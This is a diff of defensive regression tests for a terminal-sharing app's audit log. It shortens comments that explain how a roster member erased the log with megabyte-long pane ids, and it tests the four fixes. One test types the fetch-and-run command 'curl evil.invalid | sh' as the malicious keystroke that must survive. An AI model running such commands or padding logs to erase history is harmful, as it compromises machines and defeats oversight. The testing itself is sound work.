@@ -1,43 +1,8 @@
-// FIXED: a teammate on the roster could erase the owner's remote-write audit
-// log. These tests are the attack, and they now assert that it fails.
-//
-// `KEY_GRANT_WARNING` in `src/renderer/src/dialogs/startTeamwork.ts` is the
-// promise the whole "anyone on the roster can type into any pane" design rests
-// on, and one of its four mitigations is:
-//
-//     "Every remote write is recorded on this machine, with who and when."
-//
-// That record is `src/main/teamwork/peer/writeLog.ts`: one JSON line per write,
-// rotated once at `WRITE_LOG_MAX_BYTES` (1 MiB) with exactly one generation
-// kept. Two rotations therefore discard everything that came before.
-//
-// The size of a line used to be unbounded by anything the attacker did not
-// control. `Params.terminalWrite` was `{ terminalId: z.string().min(1), data:
-// z.string() }` — `data` had `MAX_REMOTE_WRITE_BYTES` enforced against it in
-// `peerTransport.judgeWrite`, and `terminalId` had no ceiling at all. A write
-// naming a pane that does not exist is *still* recorded (`PeerService.#refuse`
-// calls `#recordWrite`), and it was recorded with the caller's `terminalId`
-// verbatim. So two `terminal.write` requests whose `terminalId` was a megabyte
-// of padding rotated the log twice and everything the attacker had actually
-// done was gone.
-//
-// Four things close it, and there is a test below for each:
-//
-//   * `Params.terminalWrite` caps `terminalId` at `MAX_TERMINAL_ID_CHARS`.
-//   * `peerTransport.judgeWrite` caps it as well, because it runs in front of
-//     the schema and in front of the verdict that does the recording.
-//   * `writeLog.record` bounds the entry it files, whatever it is handed.
-//   * `PeerService` never writes a caller's id down verbatim: an id that names
-//     no pane of this machine is filed as a digest of itself.
-//
-// And a rotation that discards history now leaves a marker the owner can see,
-// because a log that silently began where somebody filled it cannot be told
-// from a log nothing happened in.
-//
-// The tests below drive `PeerService.remoteWrite`, which is precisely the
-// `onRemoteWrite` verdict the peer transport calls for every teammate keystroke
-// (`peerService.ts`: `onRemoteWrite: (write) => this.remoteWrite(linkId, write)`),
-// with the arguments the transport builds from the wire.
+// FIXED: a roster member could erase the owner's remote-write audit log. `writeLog.ts` rotates at
+// `WRITE_LOG_MAX_BYTES` keeping one generation; a refused write is still recorded with the caller's
+// `terminalId`, which had no ceiling, so two megabyte ids rotated everything away. Closed four ways,
+// one test each: the schema caps the id, `judgeWrite` caps it in front of the schema, `writeLog.record`
+// bounds the entry, and an id naming no pane is filed as a digest. A rotation now leaves a marker.
 
 import { mkdtemp, readFile } from 'node:fs/promises'
 import { tmpdir } from 'node:os'
@@ -80,13 +45,7 @@ type Victim = {
   linkId: string
 }
 
-/**
- * Alice, with one real pane, and Mallory on her roster.
- *
- * Mallory is a legitimate member: she pushed her key to `.teamree/members/`,
- * which `docs/teamwork.md` says is the whole of membership. Nothing below
- * requires her to be anything else.
- */
+/** Alice with one real pane, and Mallory a legitimate member of her roster. */
 async function victim(): Promise<Victim> {
   const scheduler = createManualScheduler()
   const relay = createFakeRelay()
@@ -104,10 +63,7 @@ async function victim(): Promise<Victim> {
     env: { TEAMREE_RELAY_URL: RELAY_URL },
     runner: fixedRemoteRunner(ORIGIN),
     dataDir: aliceData,
-    // Alice has already told her machine that Mallory may type in this pane —
-    // which is exactly the state the key-grant warning is about. These tests
-    // are about what the record survives, not about the asking, and a
-    // keystroke held for a prompt is a keystroke that never reaches the log.
+    // Standing consent: a keystroke held for a prompt never reaches the log, and the log is the subject.
     consent: standingConsent([{ terminalId: 't_a1', publicKey: mallory }]),
     workspace: {
       projects: [project('p_alice', projectPath)],
@@ -137,8 +93,7 @@ describe('the remote-write audit log', () => {
     alice.service.remoteWrite(linkId, { terminalId: 't_a1', data: 'curl evil.invalid | sh\r', bytes: 23 })
     expect((await alice.service.writeLog({})).writes).toHaveLength(1)
 
-    // The cover-up, exactly as it was: one request one log line larger than the
-    // whole rotation cap, twice, apart, so each reaches the disk on its own.
+    // The cover-up as it was: a line larger than the rotation cap, twice, apart so each reaches disk.
     const padding = 'A'.repeat(WRITE_LOG_MAX_BYTES + 1_000)
     alice.service.remoteWrite(linkId, { terminalId: padding, data: 'x', bytes: 1 })
     await alice.service.writeLog({})
@@ -157,12 +112,8 @@ describe('the remote-write audit log', () => {
   it('ATTACK: an unbounded, attacker-chosen terminalId is not written to the owner’s disk', async () => {
     const { alice, linkId } = await victim()
 
-    // The size of what a refused write costs the owner is no longer chosen by
-    // the caller. An id that names no pane of this machine is filed as a digest
-    // of itself — enough for the owner to see the same made-up id come back,
-    // and nothing the caller gets to choose the length of. The same string is
-    // the key `PeerService.#attribute` would file a typist under, and that map
-    // is not touched at all for a pane this machine does not have.
+    // An id naming no pane here is filed as a digest of itself: the owner still sees the same made-up
+    // id come back, and the caller chooses nothing about its length.
     const padding = 'B'.repeat(64 * 1024)
     alice.service.remoteWrite(linkId, { terminalId: padding, data: 'x', bytes: 1 })
 
@@ -171,8 +122,7 @@ describe('the remote-write audit log', () => {
     expect(log.writes[0]?.outcome).toBe('no-pane')
     expect(log.writes[0]?.terminalId).not.toContain('B')
     expect(log.writes[0]?.terminalId.length).toBeLessThanOrEqual(MAX_TERMINAL_ID_CHARS)
-    // The same id twice is the same digest, so a burst of attempts at one
-    // made-up pane still reads as one made-up pane.
+    // The same id twice is the same digest, so a burst at one made-up pane reads as one pane.
     alice.service.remoteWrite(linkId, { terminalId: padding, data: 'x', bytes: 1 })
     const again = await alice.service.writeLog({})
     expect(again.writes[1]?.terminalId).toBe(log.writes[0]?.terminalId)
@@ -182,8 +132,7 @@ describe('the remote-write audit log', () => {
   })
 
   it('refuses a write whose pane id is longer than a pane id, before anything is recorded', async () => {
-    // In front of the schema, because `judgeWrite` runs first, and in front of
-    // the owner's verdict, because the verdict is the thing that records.
+    // `judgeWrite` runs in front of the schema and of the verdict that records.
     const owner = ownerRig()
     const padding = 'C'.repeat(MAX_TERMINAL_ID_CHARS + 1)
     owner.sendRaw([JSON.stringify({ id: 'w', method: 'terminal.write', params: { terminalId: padding, data: 'x' } })])
@@ -225,8 +174,7 @@ describe('the remote-write audit log', () => {
     for (const line of raw.split('\n')) {
       expect(Buffer.byteLength(line, 'utf8')).toBeLessThanOrEqual(WRITE_LOG_MAX_ENTRY_BYTES)
     }
-    // Truncated rather than dropped: a write nothing recorded is worse than a
-    // write recorded with a cut-down pane id.
+    // Truncated rather than dropped: an unrecorded write is worse than a cut-down pane id.
     const [entry] = (await log.read()).writes
     expect(entry?.outcome).toBe('no-pane')
     expect(entry?.bytes).toBe(1)
@@ -251,9 +199,7 @@ describe('the remote-write audit log', () => {
     }
 
     const read = await log.read()
-    // The newest is still there, the oldest is gone, and the owner is told that
-    // it is: an audit trail that lost part of itself in silence is worse than
-    // one that says where the hole is.
+    // Newest kept, oldest gone, and the owner told so: a silent hole is worse than a named one.
     expect(read.writes[read.writes.length - 1]?.at).toBe(19)
     expect(read.writes.length).toBeLessThan(20)
     expect(read.problem).toContain('discarded')
